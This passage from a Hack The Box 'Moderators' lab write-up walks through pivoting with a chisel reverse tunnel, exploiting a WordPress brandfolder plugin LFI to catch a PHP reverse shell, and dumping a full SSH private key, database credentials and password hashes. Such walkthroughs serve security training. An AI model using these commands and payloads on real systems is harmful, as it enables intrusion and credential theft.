+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwx---</span>  7 john john 4096 Jul 14 15:51 john</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  5 lexi lexi 4096 Jul 14 10:50 lexi</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ul>
+<li>MySQL is running locally on port 3306, however we don’t have any credentials to login, yet. And a local webserver (I guess) is running on port 8080</li>
+</ul>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8080          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>    </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ul>
+<li>There is nothing of use in <code>/var/www/html</code></li>
+<li>We find what seems to be a new version of the site under <code>/opt/site.new/</code>
+<ul>
+<li>We’re unable to read <code>wp-config.php</code></li>
+<li>There are two installed plugins, <code>brandfolder</code> &amp; <code>passwords-manager</code>, found under <code>/opt/site.new/wp-content/plugins</code></li>
+</ul></li>
+<li>Running <code>ps aux</code> we can see that user <code>lexi</code> runs a script (<code>/usr/local/sbin/startup.sh</code>) to start the webserver in <code>/opt/site.new/</code></li>
+</ul>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> ps aux</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">root</span>         822  0.0  0.0   8368  3748 <span class="pp">?</span>        Ss   07:20   0:00 /usr/sbin/runuser <span class="at">-u</span> lexi /usr/local/sbin/startup.sh</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="ex">lexi</span>         865  0.0  0.0   2608   596 <span class="pp">?</span>        S    07:20   0:00 /bin/sh /usr/local/sbin/startup.sh</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="ex">lexi</span>         866  0.0  0.7 228360 31740 <span class="pp">?</span>        S    07:20   0:00 /usr/bin/php <span class="at">-S</span> 127.0.0.1:8080 <span class="at">-t</span> /opt/site.new/</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat /usr/local/sbin/startup.sh</span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/sh</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/bin/php</span> <span class="at">-S</span> 127.0.0.1:8080 <span class="at">-t</span> /opt/site.new/</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Upload <code>chisel</code> and setup a tunnel to start enumerate the local webservice. <br> <strong>Note:</strong> Port 8080 collides with my proxy settings, so I need to close this before setting up chisel.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Start server locally</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server <span class="at">-p</span> 4444 <span class="at">-reverse</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Upload and run chisel client</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@moderators:/dev/shm$</span> wget http://10.10.14.5/chisel_1.7.7_linux_amd64</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@moderators:/dev/shm$</span> chmod +x chisel_1.7.7_linux_amd64</span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@moderators:/dev/shm$</span> ./chisel_1.7.7_linux_amd64 client 10.10.14.5:4444 R:8080:127.0.0.1:8080</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/05</span> 08:34:41 client: Connecting to ws://10.10.14.5:4444</span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/05</span> 08:34:41 client: Connected <span class="er">(</span><span class="ex">Latency</span> 27.873433ms<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The new site is a total mess, probably because it refers to <code>moderators.htb</code> which I’m to lazy to fix in <code>/etc/hosts</code>. <img src="images/moderators09.png" class="img-fluid"></p>
+</section>
+<section id="step-5" class="level3">
+<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
+<p>Googling around we find that the plugin <code>brandfolder</code> have a <a href="https://www.exploit-db.com/exploits/39591">LFI/RFI vulnerability</a>, we should be able to exploit this to run commands as user <code>lexi</code>.</p>
+<p>Copy a new php reverse shell to <code>/dev/shm/</code>, name it to <code>wp-load.php</code> as per instructions and browse to <code>http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/</code> to trigger the reverse shell. And yes, the chisel tunnel needs to be up and running when triggering the reverse shell.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@moderators:/dev/shm$</span> mv rev.php wp-load.php</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators nc <span class="at">-lvnp</span> 4499</span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4499 ...</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.5</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.173]</span> 37260</span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> id <span class="kw">&amp;&amp;</span> <span class="fu">hostname</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1001<span class="kw">(</span><span class="ex">lexi</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1001<span class="kw">(</span><span class="ex">lexi</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1001<span class="kw">(</span><span class="ex">lexi</span><span class="kw">)</span><span class="ex">,1002</span><span class="er">(</span><span class="ex">moderators</span><span class="kw">)</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="ex">moderators</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cat user.txt <span class="kw">&amp;&amp;</span> <span class="fu">cat</span> .ssh/id_rsa</span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="ex">abbfc3e262e116c1559b3a2a97bdc041</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="ex">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="ex">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="ex">NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a><span class="ex">ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a><span class="ex">ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="ex">QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="ex">dQ5ymZTot+/qALnzlDkeUlT/RWtqJxJc6MlWy5/neegZRRd3YNhln/1GyL5aN/0O1gBwf3</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a><span class="ex">vY87IYFXK/W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a><span class="ex">cxbVFo9M2axqTTnr/gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a><span class="ex">vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a><span class="ex">EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a><span class="ex">uTIXx4SQy/PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy</span></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a><span class="ex">oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI/AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT</span></span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a><span class="ex">KxiiVYy9J9lL6n/w8OKLkCt08F3c65boQqPYnG/tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a><span class="ex">6gC585Q5HlJU/0VraicSXOjJVsuf53noGUUXd2DYZZ/9Rsi+Wjf9DtYAcH972POyGBVyv1</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a><span class="ex">tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a><span class="ex">ak056/4BZC81NLI/JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0/GihmCpeuLzvmicYkz5D</span></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true" tabindex="-1"></a><span class="ex">6YCOi/qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9/OojjeW8274QaVURpB</span></span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true" tabindex="-1"></a><span class="ex">C/kFL5nuH10LrnpfM/7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7/cLGvC</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true" tabindex="-1"></a><span class="ex">mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo/CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0</span></span>
+<span id="cb19-32"><a href="#cb19-32" aria-hidden="true" tabindex="-1"></a><span class="ex">07/hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX/yM2V</span></span>
+<span id="cb19-33"><a href="#cb19-33" aria-hidden="true" tabindex="-1"></a><span class="ex">vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX/EYy</span></span>
+<span id="cb19-34"><a href="#cb19-34" aria-hidden="true" tabindex="-1"></a><span class="ex">y8HfqtCPWmplcrhtw/DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp</span></span>
+<span id="cb19-35"><a href="#cb19-35" aria-hidden="true" tabindex="-1"></a><span class="ex">o1D3Rv/KRIVRog9+7e6r8aRVPf/vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu</span></span>
+<span id="cb19-36"><a href="#cb19-36" aria-hidden="true" tabindex="-1"></a><span class="ex">x4G5F1sD9bamasGARP/j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA</span></span>
+<span id="cb19-37"><a href="#cb19-37" aria-hidden="true" tabindex="-1"></a><span class="ex">wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe/DYpdFOjIK888U</span></span>
+<span id="cb19-38"><a href="#cb19-38" aria-hidden="true" tabindex="-1"></a><span class="ex">0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6</span></span>
+<span id="cb19-39"><a href="#cb19-39" aria-hidden="true" tabindex="-1"></a><span class="ex">CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT/KbXMifJn</span></span>
+<span id="cb19-40"><a href="#cb19-40" aria-hidden="true" tabindex="-1"></a><span class="ex">LrcrmS/t+QdOG2Vf/7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3/xrUZyhlWn</span></span>
+<span id="cb19-41"><a href="#cb19-41" aria-hidden="true" tabindex="-1"></a><span class="ex">NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM/u9CqWiaU</span></span>
+<span id="cb19-42"><a href="#cb19-42" aria-hidden="true" tabindex="-1"></a><span class="ex">h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC/mM40/JNJ9Rqa9Io</span></span>
+<span id="cb19-43"><a href="#cb19-43" aria-hidden="true" tabindex="-1"></a><span class="ex">9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63</span></span>
+<span id="cb19-44"><a href="#cb19-44" aria-hidden="true" tabindex="-1"></a><span class="ex">egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm</span></span>
+<span id="cb19-45"><a href="#cb19-45" aria-hidden="true" tabindex="-1"></a><span class="ex">0iAt4qjy/3uoN0NdQrX+8laOMIzRVe/Br4Py4NVmRTsMfU5t/1Jz/DXJoy9CcXD5VKkUnU</span></span>
+<span id="cb19-46"><a href="#cb19-46" aria-hidden="true" tabindex="-1"></a><span class="ex">p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb</span></span>
+<span id="cb19-47"><a href="#cb19-47" aria-hidden="true" tabindex="-1"></a><span class="ex">xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly</span></span>
+<span id="cb19-48"><a href="#cb19-48" aria-hidden="true" tabindex="-1"></a><span class="ex">J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==</span></span>
+<span id="cb19-49"><a href="#cb19-49" aria-hidden="true" tabindex="-1"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Double check that <code>lexi</code>’s id_rsa can be used for persistence before closing all reverse connections.</p>
+<pre><code>➜  moderators vim lexi-id_rsa 
+➜  moderators chmod 400 lexi-id_rsa
+➜  moderators ssh lexi@moderators.htb -i lexi-id_rsa
+lexi@moderators:~$</code></pre>
+<hr>
+</section>
+</section>
+<section id="root" class="level1">
+<h1>ROOT</h1>
+<section id="step-1-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
+<p>We are now able to read <code>wp-config.php</code>:</p>
+<pre><code>lexi@moderators:/opt/site.new$ cat wp-config.php
+[... snip ...]
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'wordpresspassword123!!' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );</code></pre>
+<p>Look if there are any users in the SQL Database:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">lexi@moderators:/opt/site.new$</span> mysql <span class="at">-u</span> wordpressuser <span class="at">-p</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: wordpresspassword123!!</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> to the MariaDB monitor.  Commands end with <span class="kw">;</span> <span class="ex">or</span> <span class="dt">\g</span>.</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Your</span> MariaDB connection id is 40</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Server</span> version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04</span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> [<span class="er">(</span><span class="ex">none</span><span class="kw">)</span><span class="ex">]</span><span class="op">&gt;</span> show databases<span class="kw">;</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Database</span>           <span class="kw">|</span></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">information_schema</span> <span class="kw">|</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wordpress</span>          <span class="kw">|</span></span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="ex">+--------------------+</span></span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="ex">2</span> rows in set <span class="er">(</span><span class="ex">0.001</span> sec<span class="kw">)</span></span>
+<span id="cb22-15"><a href="#cb22-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-16"><a href="#cb22-16" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> [<span class="er">(</span><span class="ex">none</span><span class="kw">)</span><span class="ex">]</span><span class="op">&gt;</span> use wordpress<span class="kw">;</span></span>
+<span id="cb22-17"><a href="#cb22-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Reading</span> table information for completion of table and column names</span>
+<span id="cb22-18"><a href="#cb22-18" aria-hidden="true" tabindex="-1"></a><span class="ex">You</span> can turn off this feature to get a quicker startup with <span class="at">-A</span></span>
+<span id="cb22-19"><a href="#cb22-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-20"><a href="#cb22-20" aria-hidden="true" tabindex="-1"></a><span class="ex">Database</span> changed</span>
+<span id="cb22-21"><a href="#cb22-21" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">wordpress</span><span class="pp">]</span><span class="op">&gt;</span> show tables<span class="kw">;</span></span>
+<span id="cb22-22"><a href="#cb22-22" aria-hidden="true" tabindex="-1"></a><span class="ex">+----------------------------+</span></span>
+<span id="cb22-23"><a href="#cb22-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Tables_in_wordpress</span>        <span class="kw">|</span></span>
+<span id="cb22-24"><a href="#cb22-24" aria-hidden="true" tabindex="-1"></a><span class="ex">+----------------------------+</span></span>
+<span id="cb22-25"><a href="#cb22-25" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_commentmeta</span>             <span class="kw">|</span></span>
+<span id="cb22-26"><a href="#cb22-26" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_comments</span>                <span class="kw">|</span></span>
+<span id="cb22-27"><a href="#cb22-27" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_links</span>                   <span class="kw">|</span></span>
+<span id="cb22-28"><a href="#cb22-28" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_options</span>                 <span class="kw">|</span></span>
+<span id="cb22-29"><a href="#cb22-29" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_pms_category</span>            <span class="kw">|</span></span>
+<span id="cb22-30"><a href="#cb22-30" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_pms_passwords</span>           <span class="kw">|</span></span>
+<span id="cb22-31"><a href="#cb22-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_postmeta</span>                <span class="kw">|</span></span>
+<span id="cb22-32"><a href="#cb22-32" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_posts</span>                   <span class="kw">|</span></span>
+<span id="cb22-33"><a href="#cb22-33" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_prflxtrflds_fields_meta</span> <span class="kw">|</span></span>
+<span id="cb22-34"><a href="#cb22-34" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_term_relationships</span>      <span class="kw">|</span></span>
+<span id="cb22-35"><a href="#cb22-35" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_term_taxonomy</span>           <span class="kw">|</span></span>
+<span id="cb22-36"><a href="#cb22-36" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_termmeta</span>                <span class="kw">|</span></span>
+<span id="cb22-37"><a href="#cb22-37" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_terms</span>                   <span class="kw">|</span></span>
+<span id="cb22-38"><a href="#cb22-38" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_usermeta</span>                <span class="kw">|</span></span>
+<span id="cb22-39"><a href="#cb22-39" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_users</span>                   <span class="kw">|</span></span>
+<span id="cb22-40"><a href="#cb22-40" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">wp_wpfm_backup</span>             <span class="kw">|</span></span>
+<span id="cb22-41"><a href="#cb22-41" aria-hidden="true" tabindex="-1"></a><span class="ex">+----------------------------+</span></span>
+<span id="cb22-42"><a href="#cb22-42" aria-hidden="true" tabindex="-1"></a><span class="ex">16</span> rows in set <span class="er">(</span><span class="ex">0.000</span> sec<span class="kw">)</span></span>
+<span id="cb22-43"><a href="#cb22-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-44"><a href="#cb22-44" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">wordpress</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from wp_users<span class="kw">;</span></span>
+<span id="cb22-45"><a href="#cb22-45" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span>
+<span id="cb22-46"><a href="#cb22-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ID</span> <span class="kw">|</span> <span class="ex">user_login</span> <span class="kw">|</span> <span class="ex">user_pass</span>                          <span class="kw">|</span> <span class="ex">user_nicename</span> <span class="kw">|</span> <span class="ex">user_email</span>           <span class="kw">|</span> <span class="ex">user_url</span>                <span class="kw">|</span> <span class="ex">user_registered</span>     <span class="kw">|</span> <span class="ex">user_activation_key</span> <span class="kw">|</span> <span class="ex">user_status</span> <span class="kw">|</span> <span class="ex">display_name</span> <span class="kw">|</span></span>
+<span id="cb22-47"><a href="#cb22-47" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span>
+<span id="cb22-48"><a href="#cb22-48" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">1</span> <span class="kw">|</span> <span class="ex">admin</span>      <span class="kw">|</span> <span class="va">$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0</span> <span class="kw">|</span> <span class="ex">admin</span>         <span class="kw">|</span> <span class="ex">admin@moderators.htb</span> <span class="kw">|</span> <span class="ex">http://192.168.1.4:8080</span> <span class="kw">|</span> <span class="ex">2021-09-11</span> 05:30:20 <span class="kw">|</span>                     <span class="kw">|</span>           <span class="ex">0</span> <span class="kw">|</span> <span class="ex">admin</span>        <span class="kw">|</span></span>
+<span id="cb22-49"><a href="#cb22-49" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">2</span> <span class="kw">|</span> <span class="ex">lexi</span>       <span class="kw">|</span> <span class="va">$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461</span> <span class="kw">|</span> <span class="ex">lexi</span>          <span class="kw">|</span> <span class="ex">lexi@moderators.htb</span>  <span class="kw">|</span>                         <span class="kw">|</span> <span class="ex">2021-09-12</span> 16:51:16 <span class="kw">|</span>                     <span class="kw">|</span>           <span class="ex">0</span> <span class="kw">|</span> <span class="ex">lexi</span>         <span class="kw">|</span></span>
+<span id="cb22-50"><a href="#cb22-50" aria-hidden="true" tabindex="-1"></a><span class="ex">+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+--------------+</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We’re unable to crack any of the hashes</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators cat wp.hash                                                      </span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">admin:</span><span class="va">$P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">lexi:</span><span class="va">$P$BZ0Fj92qgnvg4F52r3lpwHejcXag461</span></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators hashcat <span class="at">-a0</span> <span class="at">-m400</span> wp.hash /usr/share/wordlists/rockyou.txt <span class="at">--user</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Instead we investigate the possibility of changing the password for user <code>admin</code>. From the site <a href="https://www.useotools.com/wordpress-password-hash-generator/output">useotools.com</a> we write wanted password and are returned both the hash and also the SQL Query needed to update the table.</p>
+<p><img src="images/moderators10.png" class="img-fluid"></p>
